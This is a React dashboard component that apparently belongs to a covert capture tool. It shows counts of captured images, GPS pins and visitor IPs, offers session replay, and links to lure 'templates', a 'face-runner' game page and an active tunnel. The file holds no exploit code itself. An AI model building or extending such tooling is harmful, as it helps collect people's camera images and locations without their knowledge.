import { useEffect, useState, useCallback } from 'react'
import { api, Stats } from '../api/client'

function StatCard({ label, value, sub, icon, color }: { label: string; value: string | number; sub?: string; icon: string; color: string }) {
  return (
    <div className={`bg-gray-900 border border-gray-800 rounded-2xl p-5 relative overflow-hidden transition-all transition-all hover:shadow-lg`}>
      <div className="absolute top-4 right-4 text-3xl opacity-15">{icon}</div>
      <div className="text-xs text-gray-500 uppercase tracking-wider font-medium">{label}</div>
      <div className={`text-3xl font-bold mt-2 tabular-nums text-cyan-400`}>{value}</div>
      {sub && <div className="text-xs text-gray-600 mt-1">{sub}</div>}
    </div>
  )
}

export default function Dashboard() {
  const [stats, setStats] = useState<Stats | null>(null)
  const [loading, setLoading] = useState(true)
  const [autoRefresh, setAutoRefresh] = useState(true)
  const [lastUpdate, setLastUpdate] = useState('')

  const refresh = useCallback(async () => {
    try {
      setStats(await api.stats())
      setLastUpdate(new Date().toLocaleTimeString())
    } catch (e) { console.error(e) }
    finally { setLoading(false) }
  }, [])

  useEffect(() => {
    refresh()
    if (autoRefresh) {
      const timer = setInterval(refresh, 3000)
      return () => clearInterval(timer)
    }
  }, [refresh, autoRefresh])

  if (loading) {
    return (
      <div className="flex items-center justify-center h-64">
        <div className="animate-spin w-8 h-8 border-2 border-cyan-500 border-t-transparent rounded-full"></div>
      </div>
    )
  }

  const sessionMin = stats?.first_capture ? Math.floor((Date.now() / 1000 - stats.first_capture) / 60) : 0
  const lastActive = stats?.last_capture ? Math.floor((Date.now() / 1000 - stats.last_capture) / 60) : null

  return (
    <div className="space-y-6">
      <div className="flex items-center justify-between flex-wrap gap-3">
        <div>
          <h2 className="text-2xl font-bold text-white">Dashboard</h2>
          <p className="text-sm text-gray-500 mt-1">Real-time capture monitoring</p>
        </div>
        <div className="flex items-center gap-3">
          <span className="text-xs text-gray-600">Updated {lastUpdate}</span>
          <button
            onClick={() => setAutoRefresh(!autoRefresh)}
            className={`flex items-center gap-2 px-3 py-1.5 rounded-lg text-xs font-medium transition-all ${
              autoRefresh ? 'bg-green-500/10 text-green-400' : 'bg-gray-800 text-gray-500'
            }`}
          >
            <span className={`w-1.5 h-1.5 rounded-full ${autoRefresh ? 'bg-green-400 animate-pulse' : 'bg-gray-600'}`}></span>
            {autoRefresh ? 'Live' : 'Paused'}
          </button>
        </div>
      </div>

      <div className="grid grid-cols-2 md:grid-cols-3 lg:grid-cols-5 gap-4">
        <StatCard label="Captures" value={stats?.total_captures ?? 0} sub={`${(stats?.total_size_mb ?? 0).toFixed(2)} MB`} icon="📷" color="cyan" />
        <StatCard label="Locations" value={stats?.total_locations ?? 0} sub="GPS pins" icon="📍" color="green" />
        <StatCard label="Unique IPs" value={stats?.unique_ips ?? 0} sub={`${stats?.total_ips ?? 0} visits`} icon="🌐" color="blue" />
        <StatCard label="Data Size" value={`${(stats?.total_size_mb ?? 0).toFixed(1)}`} sub="MB total" icon="💾" color="purple" />
        <StatCard label="Session" value={`${sessionMin}m`} sub={lastActive !== null ? `${lastActive}m ago` : 'waiting'} icon="⏱️" color="yellow" />
      </div>

      <div className="grid grid-cols-1 lg:grid-cols-2 gap-4">
        <div className="bg-gray-900 border border-gray-800 rounded-2xl p-5">
          <h3 className="text-sm font-semibold text-gray-400 mb-4 flex items-center gap-2">
            <span>⚡</span> Quick Actions
          </h3>
          <div className="grid grid-cols-2 gap-3">
            <a href="/captures" className="flex items-center gap-2 px-4 py-3 bg-cyan-500/10 text-cyan-400 rounded-xl text-sm font-medium hover:bg-cyan-500/20 transition-all">
              <span>📷</span> View Captures
            </a>
            <a href="/locations" className="flex items-center gap-2 px-4 py-3 bg-green-500/10 text-green-400 rounded-xl text-sm font-medium hover:bg-green-500/20 transition-all">
              <span>📍</span> View Locations
            </a>
            <a href="/ips" className="flex items-center gap-2 px-4 py-3 bg-blue-500/10 text-blue-400 rounded-xl text-sm font-medium hover:bg-blue-500/20 transition-all">
              <span>🌐</span> View IPs
            </a>
            <a href="/replay" className="flex items-center gap-2 px-4 py-3 bg-yellow-500/10 text-yellow-400 rounded-xl text-sm font-medium hover:bg-yellow-500/20 transition-all">
              <span>⚡</span> Session Replay
            </a>
            <a href="/templates" className="flex items-center gap-2 px-4 py-3 bg-purple-500/10 text-purple-400 rounded-xl text-sm font-medium hover:bg-purple-500/20 transition-all">
              <span>🎭</span> Templates
            </a>
            <a href="/t/face-runner" target="_blank" rel="noreferrer" className="flex items-center gap-2 px-4 py-3 bg-pink-500/10 text-pink-400 rounded-xl text-sm font-medium hover:bg-pink-500/20 transition-all">
              <span>🎮</span> Open Game
            </a>
          </div>
        </div>

        <div className="bg-gray-900 border border-gray-800 rounded-2xl p-5">
          <h3 className="text-sm font-semibold text-gray-400 mb-4 flex items-center gap-2">
            <span>🔗</span> System Status
          </h3>
          <div className="space-y-3">
            <div className="flex items-center justify-between">
              <span className="text-sm text-gray-500">App Server</span>
              <span className="flex items-center gap-2 text-xs text-green-400">
                <span className="w-1.5 h-1.5 rounded-full bg-green-400 animate-pulse"></span>
                Online
              </span>
            </div>
            <div className="flex items-center justify-between">
              <span className="text-sm text-gray-500">SQLite Database</span>
              <span className="flex items-center gap-2 text-xs text-green-400">
                <span className="w-1.5 h-1.5 rounded-full bg-green-400"></span>
                Connected
              </span>
            </div>
            <div className="flex items-center justify-between">
              <span className="text-sm text-gray-500">TrailBase</span>
              <a href="http://localhost:4000/_/admin/" target="_blank" rel="noreferrer" className="flex items-center gap-2 text-xs text-blue-400 hover:underline">
                <span className="w-1.5 h-1.5 rounded-full bg-blue-400"></span>
                Admin UI →
              </a>
            </div>
            <div className="flex items-center justify-between">
              <span className="text-sm text-gray-500">Tunnel</span>
              <span className="flex items-center gap-2 text-xs text-green-400">
                <span className="w-1.5 h-1.5 rounded-full bg-green-400 animate-pulse"></span>
                Active
              </span>
            </div>
          </div>
        </div>
      </div>
    </div>
  )
}
